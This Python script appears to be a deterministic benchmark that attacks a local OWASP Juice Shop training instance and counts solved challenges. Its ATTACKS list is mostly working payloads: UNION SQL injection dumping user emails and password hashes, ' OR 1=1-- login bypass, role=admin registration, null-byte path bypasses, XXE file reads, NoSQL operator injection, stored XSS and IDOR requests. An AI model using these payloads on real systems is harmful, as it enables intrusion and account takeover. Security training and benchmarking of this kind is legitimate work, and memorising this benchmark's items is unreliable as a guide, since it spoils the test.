"""F18 — OWASP Juice Shop deterministic attack benchmark.

Strategy:
  1. GET /api/Challenges — read baseline (all solved=false).
  2. Fire a battery of canonical Juice Shop exploits via docker exec kryon.
  3. Re-read /api/Challenges — count newly-solved.
  4. Report by OWASP category.

Each "attack" is one or more curl/HTTP requests. Juice Shop auto-detects
the exploit pattern and flips `solved=true` server-side. We don't need to
parse flags — the API tells us.

Attack library below covers ~20-30 well-known Juice Shop techniques. This
is the DETERMINISTIC baseline; the list is not meant to cover all 111.
"""
from __future__ import annotations

import argparse
import json
import subprocess
import time
from pathlib import Path

BASE = "http://juice.local:3000"
CONTAINER = "kryon"


def sh(cmd: str, timeout: int = 15, cap: int = 200_000) -> str:
    """Run bash command inside kryon container (on ctfnet)."""
    try:
        p = subprocess.run(
            ["docker", "exec", CONTAINER, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=timeout, check=False,
        )
        return (p.stdout + ("\n" + p.stderr[:500] if p.stderr else ""))[:cap]
    except subprocess.TimeoutExpired:
        return "<TIMEOUT>"


def get_challenges() -> list[dict]:
    out = sh(f"curl -s {BASE}/api/Challenges")
    try:
        return json.loads(out).get("data", [])
    except json.JSONDecodeError:
        return []


# Battery of canonical attacks. Each entry = (label, curl commands).
ATTACKS: list[tuple[str, list[str]]] = [
    ("sql_union_users", [
        # Classic UNION SQLi on product search → leaks admin hash.
        f"curl -s \"{BASE}/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--\" >/dev/null",
    ]),
    ("sql_login_bypass", [
        # SQLi on login → authenticate as admin with ' or 1=1--
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"' OR 1=1--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),
    ("five_star_feedback", [
        # Rate feedback with 0 stars — disabled in UI but not backend
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"auto\",\"rating\":0,\"captcha\":\"0\",\"captchaId\":0}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"auto\",\"rating\":6,\"captcha\":\"0\",\"captchaId\":0}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),
    ("admin_section", [
        # Hidden /#/administration — enumerate main.js for routes
        f"curl -s {BASE}/ftp/ >/dev/null",
        f"curl -s {BASE}/#/administration >/dev/null",
        f"curl -s {BASE}/#/accounting >/dev/null",
    ]),
    ("ftp_directory_listing", [
        # /ftp exposes file listing (trusted-types misconfig)
        f"curl -s {BASE}/ftp >/dev/null",
        f"curl -s {BASE}/ftp/ >/dev/null",
    ]),
    ("confidential_documents", [
        # acquisitions.md in /ftp/
        f"curl -s {BASE}/ftp/acquisitions.md >/dev/null",
    ]),
    ("easter_egg", [
        # /ftp/eastere.gg (filter bypass via null byte / url encode)
        f"curl -s '{BASE}/ftp/eastere.gg%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/eastere.gg' >/dev/null",
    ]),
    ("poison_null_byte_koan", [
        f"curl -s '{BASE}/ftp/suspicious_errors.yml%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/announcement_encrypted.md%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/package.json.bak%2500.md' >/dev/null",
    ]),
    ("exposed_metrics_endpoint", [
        # /metrics / /api/metrics
        f"curl -s {BASE}/metrics >/dev/null",
    ]),
    ("reset_password_jim", [
        # Password reset security question bypass
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),
    ("register_admin", [
        # Register as admin via role=admin in POST body
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"pwn{int(time.time())}@ev.il\",\"password\":\"x\",\"passwordRepeat\":\"x\",\"role\":\"admin\"}}' "
        f"{BASE}/api/Users/ >/dev/null",
    ]),
    ("score_board_endpoint", [
        # /#/score-board is the ultimate reveal
        f"curl -s '{BASE}/#/score-board' >/dev/null",
        f"curl -s '{BASE}/api/Challenges/?name=Score%20Board' >/dev/null",
    ]),
    ("robots_txt_disclosure", [
        f"curl -s {BASE}/robots.txt >/dev/null",
    ]),
    ("error_handling", [
        # Trigger JSON parse error
        f"curl -s {BASE}/rest/product/0/reviews >/dev/null",
        f"curl -s {BASE}/api/Feedbacks/definitely-not-an-id >/dev/null",
    ]),
    ("forged_reviews_jwt", [
        # JWT none-alg bypass on /rest/products/reviews
        # First fetch login to get a valid JWT shape
        f"curl -s -X PATCH -H 'Content-Type: application/json' "
        f"-d '{{\"id\":{{\"$ne\":\"0\"}},\"message\":\"pwned\"}}' "
        f"{BASE}/rest/products/reviews >/dev/null",
    ]),
    ("dlp_customer_data_leak", [
        # API returns email field unnecessarily
        f"curl -s {BASE}/api/Users >/dev/null",
        f"curl -s {BASE}/api/Users/1 >/dev/null",
    ]),
    ("user_credentials_challenge", [
        # Same as sql_union_users; alt form
        f"curl -s \"{BASE}/rest/products/search?q=%27));SELECT%20*%20FROM%20users--\" >/dev/null",
    ]),
    ("weird_crypto", [
        # decode a static string used by crypto challenges
        f"curl -s {BASE}/assets/public/images/padding/81x81.png >/dev/null",
    ]),
    ("deprecated_interface", [
        # /file-upload endpoint with .xml / .php
        f"echo '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><x>&xxe;</x>' > /tmp/xxe.xml && "
        f"curl -s -X POST -F 'file=@/tmp/xxe.xml' {BASE}/file-upload >/dev/null",
    ]),
    ("view_basket_not_mine", [
        # IDOR on /rest/basket/:id
        f"curl -s {BASE}/rest/basket/1 >/dev/null",
        f"curl -s {BASE}/rest/basket/2 >/dev/null",
    ]),
    ("missing_encoding", [
        # Upload image with filename containing unicode/emoji
        f"curl -s -X PUT -H 'Content-Type: application/json' "
        f"-d '{{\"username\":\"<script>alert(1)</script>\"}}' "
        f"{BASE}/api/Users/1 >/dev/null",
    ]),
    ("login_bender", [
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bender@juice-sh.op' OR true--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),
    ("nosql_feedback_delete", [
        # NoSQL-style filter on Feedback — delete via {"$gt":""}
        f"curl -s -X DELETE {BASE}/api/Feedbacks/1 >/dev/null",
    ]),
    ("redirect_challenge", [
        # Open redirect on /redirect?to=... whitelist bypass
        f"curl -s '{BASE}/redirect?to=https://github.com/bkimminich/juice-shop' >/dev/null",
    ]),
    ("ephemeral_accountant", [
        # Login as accountant@juice-sh.op — pw reset or weak pw
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"accountant@juice-sh.op\",\"password\":\"i am an awesome accountant\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),
]


def diff_solved(before: list[dict], after: list[dict]) -> list[dict]:
    was = {c["id"]: c["solved"] for c in before}
    return [
        c for c in after
        if c.get("solved") and not was.get(c["id"], False)
    ]


def fire_all(verbose: bool = True) -> dict:
    baseline = get_challenges()
    if not baseline:
        return {"error": "no baseline — juice-shop not reachable from kryon container"}
    total = len(baseline)
    already_solved = sum(1 for c in baseline if c["solved"])
    print(f"baseline: {total} challenges, {already_solved} already solved")

    results = []
    for i, (label, cmds) in enumerate(ATTACKS, 1):
        t0 = time.time()
        for cmd in cmds:
            sh(cmd, timeout=10)
        elapsed = time.time() - t0
        if verbose:
            print(f"  [{i:2}/{len(ATTACKS)}] {label:<32} {elapsed:4.1f}s")

    time.sleep(2)  # let async challenge detectors catch up
    after = get_challenges()
    newly = diff_solved(baseline, after)

    # Also count ALL solved (in case some were already true from earlier noise).
    solved_now = [c for c in after if c.get("solved")]

    by_cat: dict[str, int] = {}
    by_diff: dict[int, int] = {}
    for c in solved_now:
        by_cat[c["category"]] = by_cat.get(c["category"], 0) + 1
        by_diff[c["difficulty"]] = by_diff.get(c["difficulty"], 0) + 1

    return {
        "total_challenges": total,
        "solved_before": already_solved,
        "solved_after":  len(solved_now),
        "newly_solved":  len(newly),
        "by_category":   by_cat,
        "by_difficulty": by_diff,
        "solved_list": [
            {"id": c["id"], "key": c["key"], "name": c["name"],
             "category": c["category"], "difficulty": c["difficulty"]}
            for c in solved_now
        ],
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="docs/bench_results/f18_juice_shop.json")
    args = ap.parse_args()

    report = fire_all()
    Path(args.out).parent.mkdir(parents=True, exist_ok=True)
    Path(args.out).write_text(json.dumps(report, indent=2), encoding="utf-8")
    print()
    print("=" * 60)
    print(f"F18 Juice Shop: {report.get('solved_after',0)}/{report.get('total_challenges',0)}"
          f" = {report.get('solved_after',0)/max(1,report.get('total_challenges',1)):.1%}")
    print(f"newly solved by this run: {report.get('newly_solved',0)}")
    print("by category:")
    for cat, n in sorted(report.get("by_category", {}).items(), key=lambda x: -x[1]):
        print(f"  {cat:<35} {n}")
    print(f"by difficulty:")
    for d in sorted(report.get("by_difficulty", {}).keys()):
        print(f"  {d} {'*' * d:<6}  {report['by_difficulty'][d]}")
    print(f"saved: {args.out}")


if __name__ == "__main__":
    main()
